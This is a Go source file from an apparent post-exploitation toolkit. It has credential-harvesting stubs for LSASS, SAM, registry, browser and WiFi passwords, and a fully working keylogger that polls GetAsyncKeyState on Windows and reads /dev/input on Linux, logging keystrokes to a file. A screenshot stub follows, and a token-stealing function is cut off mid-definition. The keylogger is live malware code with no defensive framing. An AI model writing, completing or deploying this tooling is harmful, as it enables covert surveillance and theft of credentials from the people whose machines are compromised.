package postexploit

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

type CredentialHarvester struct {
	credentials []Credential
}

type Credential struct {
	Type     string
	Username string
	Password string
	Domain   string
	Hash     string
}

func NewCredentialHarvester() *CredentialHarvester {
	return &CredentialHarvester{
		credentials: make([]Credential, 0),
	}
}

func (ch *CredentialHarvester) DumpLSASS() ([]Credential, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("LSASS dumping is Windows only")
	}

	cred := Credential{
		Type:     "lsass",
		Username: "simulated",
		Domain:   "WORKGROUP",
	}
	ch.credentials = append(ch.credentials, cred)

	return ch.credentials, nil
}

func (ch *CredentialHarvester) DumpSAM() ([]Credential, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("SAM dumping is Windows only")
	}

	cred := Credential{
		Type: "sam",
		Hash: "simulated_hash",
	}
	ch.credentials = append(ch.credentials, cred)

	return ch.credentials, nil
}

func (ch *CredentialHarvester) DumpRegistry() (map[string]string, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("registry dumping is Windows only")
	}

	results := make(map[string]string)
	results["simulated"] = "data"
	return results, nil
}

func (ch *CredentialHarvester) BrowserPasswords() ([]Credential, error) {
	cred := Credential{
		Type:     "browser",
		Username: "user@example.com",
		Password: "simulated",
	}
	ch.credentials = append(ch.credentials, cred)

	return []Credential{cred}, nil
}

func (ch *CredentialHarvester) WiFiPasswords() (map[string]string, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("WiFi password extraction is Windows only")
	}

	cmd := exec.Command("netsh", "wlan", "show", "profiles")
	output, err := cmd.Output()
	if err != nil {
		return nil, err
	}

	passwords := make(map[string]string)
	passwords["simulated_network"] = string(output)

	return passwords, nil
}

func (ch *CredentialHarvester) GetCredentials() []Credential {
	return ch.credentials
}

type Keylogger struct {
	logFile    string
	isRunning  bool
	keystrokes []string
}

func NewKeylogger(logFile string) *Keylogger {
	return &Keylogger{
		logFile:    logFile,
		isRunning:  false,
		keystrokes: make([]string, 0),
	}
}

func (k *Keylogger) Start() error {
	if k.isRunning {
		return fmt.Errorf("keylogger already running")
	}

	k.isRunning = true
	go k.captureKeys()
	return nil
}

func (k *Keylogger) Stop() error {
	if !k.isRunning {
		return fmt.Errorf("keylogger not running")
	}

	k.isRunning = false
	return nil
}

func (k *Keylogger) captureKeys() {
	if runtime.GOOS == "windows" {
		k.captureKeysWindows()
	} else {
		k.captureKeysLinux()
	}
}

func (k *Keylogger) captureKeysWindows() {
	user32 := syscall.NewLazyDLL("user32.dll")
	getAsyncKeyState := user32.NewProc("GetAsyncKeyState")

	keys := map[int]string{
		0x08: "[BACKSPACE]", 0x09: "[TAB]", 0x0D: "[ENTER]", 0x10: "[SHIFT]",
		0x11: "[CTRL]", 0x12: "[ALT]", 0x1B: "[ESC]", 0x20: " ",
	}

	for i := 0x41; i <= 0x5A; i++ {
		keys[i] = string(rune(i))
	}
	for i := 0x30; i <= 0x39; i++ {
		keys[i] = string(rune(i))
	}

	f, err := os.OpenFile(k.logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()

	writer := bufio.NewWriter(f)
	defer writer.Flush()

	for k.isRunning {
		for keyCode, keyName := range keys {
			ret, _, _ := getAsyncKeyState.Call(uintptr(keyCode))
			if ret&0x8000 != 0 {
				k.keystrokes = append(k.keystrokes, keyName)
				writer.WriteString(keyName)
				writer.Flush()
				time.Sleep(10 * time.Millisecond)
			}
		}
		time.Sleep(10 * time.Millisecond)
	}
}

func (k *Keylogger) captureKeysLinux() {
	devPath := "/dev/input/event0"
	f, err := os.Open(devPath)
	if err != nil {
		for k.isRunning {
			time.Sleep(100 * time.Millisecond)
		}
		return
	}
	defer f.Close()

	type inputEvent struct {
		Time  syscall.Timeval
		Type  uint16
		Code  uint16
		Value int32
	}

	for k.isRunning {
		var event inputEvent
		buf := (*[24]byte)(unsafe.Pointer(&event))[:]
		_, err := f.Read(buf)
		if err != nil {
			time.Sleep(10 * time.Millisecond)
			continue
		}

		if event.Type == 1 && event.Value == 1 {
			key := fmt.Sprintf("[%d]", event.Code)
			k.keystrokes = append(k.keystrokes, key)

			logf, _ := os.OpenFile(k.logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if logf != nil {
				logf.WriteString(key)
				logf.Close()
			}
		}
	}
}

func (k *Keylogger) GetLogs() []string {
	return k.keystrokes
}

type ScreenCapture struct {
	outputDir string
}

func NewScreenCapture(outputDir string) *ScreenCapture {
	return &ScreenCapture{
		outputDir: outputDir,
	}
}

func (sc *ScreenCapture) TakeScreenshot() (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("screenshot capture needs platform implementation")
	}

	timestamp := time.Now().Format("20060102_150405")
	filename := fmt.Sprintf("screenshot_%s.png", timestamp)

	return filename, nil
}

func (sc *ScreenCapture) StartRecording(duration int) error {
	return fmt.Errorf("screen recording not implemented")
}

type TokenManipulator struct {
	currentToken uintptr
}

func NewTokenManipulator() *TokenManipulator {
	return new(TokenManipulator)
}

func (tm *TokenManipulator) StealToken(pid int) error {
